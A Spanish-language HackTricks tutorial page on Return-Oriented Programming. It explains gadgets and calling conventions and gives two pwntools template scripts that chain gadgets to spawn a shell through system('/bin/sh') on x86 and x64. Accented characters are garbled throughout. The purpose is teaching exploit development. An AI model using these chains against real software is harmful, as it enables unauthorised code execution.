# ROP - Programaci贸n Orientada a Retornos

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informaci贸n B谩sica**

**Programaci贸n Orientada a Retornos (ROP)** es una t茅cnica de explotaci贸n avanzada utilizada para eludir medidas de seguridad como **No-Execute (NX)** o **Data Execution Prevention (DEP)**. En lugar de inyectar y ejecutar shellcode, un atacante aprovecha fragmentos de c贸digo ya presentes en el binario o en bibliotecas cargadas, conocidos como **"gadgets"**. Cada gadget generalmente termina con una instrucci贸n `ret` y realiza una peque帽a operaci贸n, como mover datos entre registros o realizar operaciones aritm茅ticas. Al encadenar estos gadgets, un atacante puede construir una carga 煤til para realizar operaciones arbitrarias, eludiendo efectivamente las protecciones NX/DEP.

### C贸mo Funciona ROP

1. **Secuestro del Flujo de Control**: Primero, un atacante necesita secuestrar el flujo de control de un programa, t铆picamente explotando un desbordamiento de b煤fer para sobrescribir una direcci贸n de retorno guardada en la pila.
2. **Encadenamiento de Gadgets**: El atacante luego selecciona y encadena cuidadosamente gadgets para realizar las acciones deseadas. Esto podr铆a implicar configurar argumentos para una llamada a funci贸n, llamar a la funci贸n (por ejemplo, `system("/bin/sh")`), y manejar cualquier limpieza o operaciones adicionales necesarias.
3. **Ejecuci贸n de la Carga til**: Cuando la funci贸n vulnerable retorna, en lugar de regresar a una ubicaci贸n leg铆tima, comienza a ejecutar la cadena de gadgets.

### Herramientas

T铆picamente, los gadgets se pueden encontrar usando **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** o directamente desde **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Ejemplo de Cadena ROP en x86

### **Convenciones de Llamada x86 (32-bit)**

* **cdecl**: El llamador limpia la pila. Los argumentos de la funci贸n se empujan en la pila en orden inverso (de derecha a izquierda). **Los argumentos se empujan en la pila de derecha a izquierda.**
* **stdcall**: Similar a cdecl, pero el llamado es responsable de limpiar la pila.

### **Encontrando Gadgets**

Primero, supongamos que hemos identificado los gadgets necesarios dentro del binario o sus bibliotecas cargadas. Los gadgets que nos interesan son:

* `pop eax; ret`: Este gadget saca el valor superior de la pila en el registro `EAX` y luego retorna, permiti茅ndonos controlar `EAX`.
* `pop ebx; ret`: Similar al anterior, pero para el registro `EBX`, habilitando el control sobre `EBX`.
* `mov [ebx], eax; ret`: Mueve el valor en `EAX` a la ubicaci贸n de memoria apuntada por `EBX` y luego retorna. Esto se llama a menudo un **gadget de escritura-qu茅-d贸nde**.
* Adem谩s, tenemos la direcci贸n de la funci贸n `system()` disponible.

### **Cadena ROP**

Usando **pwntools**, preparamos la pila para la ejecuci贸n de la cadena ROP de la siguiente manera, con el objetivo de ejecutar `system('/bin/sh')`, nota c贸mo la cadena comienza con:

1. Una instrucci贸n `ret` para prop贸sitos de alineaci贸n (opcional)
2. Direcci贸n de la funci贸n `system` (suponiendo ASLR desactivado y libc conocida, m谩s informaci贸n en [**Ret2lib**](ret2lib/))
3. Marcador de posici贸n para la direcci贸n de retorno de `system()`
4. Direcci贸n de la cadena `"/bin/sh"` (par谩metro para la funci贸n system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Cadena ROP en x64 Ejemplo

### **x64 (64-bit) Convenciones de llamada**

* Utiliza la convenci贸n de llamada **System V AMD64 ABI** en sistemas similares a Unix, donde los **primeros seis argumentos enteros o punteros se pasan en los registros `RDI`, `RSI`, `RDX`, `RCX`, `R8` y `R9`**. Los argumentos adicionales se pasan en la pila. El valor de retorno se coloca en `RAX`.
* La convenci贸n de llamada **Windows x64** utiliza `RCX`, `RDX`, `R8` y `R9` para los primeros cuatro argumentos enteros o punteros, con argumentos adicionales pasados en la pila. El valor de retorno se coloca en `RAX`.
* **Registros**: los registros de 64 bits incluyen `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` y `R8` a `R15`.

#### **Encontrando Gadgets**

Para nuestro prop贸sito, centr茅monos en gadgets que nos permitan establecer el registro **RDI** (para pasar la cadena **"/bin/sh"** como argumento a **system()**) y luego llamar a la funci贸n **system()**. Supondremos que hemos identificado los siguientes gadgets:

* **pop rdi; ret**: Extrae el valor superior de la pila en **RDI** y luego retorna. Esencial para establecer nuestro argumento para **system()**.
* **ret**: Un retorno simple, 煤til para la alineaci贸n de la pila en algunos escenarios.

Y sabemos la direcci贸n de la funci贸n **system()**.

### **Cadena ROP**

A continuaci贸n se muestra un ejemplo utilizando **pwntools** para configurar y ejecutar una cadena ROP con el objetivo de ejecutar **system('/bin/sh')** en **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
En este ejemplo:

* Utilizamos el gadget **`pop rdi; ret`** para establecer **`RDI`** en la direcci贸n de **`"/bin/sh"`**.
* Saltamos directamente a **`system()`** despu茅s de establecer **`RDI`**, con la direcci贸n de **system()** en la cadena.
* Se utiliza **`ret_gadget`** para la alineaci贸n si el entorno objetivo lo requiere, lo cual es m谩s com煤n en **x64** para asegurar una alineaci贸n adecuada de la pila antes de llamar a funciones.

### Alineaci贸n de la Pila

**El ABI x86-64** asegura que la **pila est茅 alineada a 16 bytes** cuando se ejecuta una **instrucci贸n de llamada**. **LIBC**, para optimizar el rendimiento, **utiliza instrucciones SSE** (como **movaps**) que requieren esta alineaci贸n. Si la pila no est谩 alineada correctamente (lo que significa que **RSP** no es un m煤ltiplo de 16), las llamadas a funciones como **system** fallar谩n en una **cadena ROP**. Para solucionar esto, simplemente agrega un **gadget ret** antes de llamar a **system** en tu cadena ROP.

## Diferencia principal entre x86 y x64

{% hint style="success" %}
Dado que x64 utiliza registros para los primeros argumentos, a menudo requiere menos gadgets que x86 para llamadas a funciones simples, pero encontrar y encadenar los gadgets correctos puede ser m谩s complejo debido al mayor n煤mero de registros y al espacio de direcciones m谩s grande. El mayor n煤mero de registros y el espacio de direcciones m谩s grande en la arquitectura **x64** ofrecen tanto oportunidades como desaf铆os para el desarrollo de exploits, especialmente en el contexto de la Programaci贸n Orientada a Retornos (ROP).
{% endhint %}

## Protecciones

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Canarios de Pila**](../common-binary-protections-and-bypasses/stack-canaries/)

## Otros Ejemplos y Referencias

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## T茅cnicas basadas en ROP

Ten en cuenta que ROP es solo una t茅cnica para ejecutar c贸digo arbitrario. Basado en ROP se desarrollaron muchas t茅cnicas Ret2XXX:

* **Ret2lib**: Usa ROP para llamar a funciones arbitrarias de una biblioteca cargada con par谩metros arbitrarios (generalmente algo como `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Usa ROP para preparar una llamada a una syscall, por ejemplo, `execve`, y hacer que ejecute comandos arbitrarios.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: El primero abusar谩 de EBP en lugar de EIP para controlar el flujo y el segundo es similar a Ret2lib, pero en este caso el flujo se controla principalmente con direcciones EBP (aunque tambi茅n es necesario controlar EIP).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
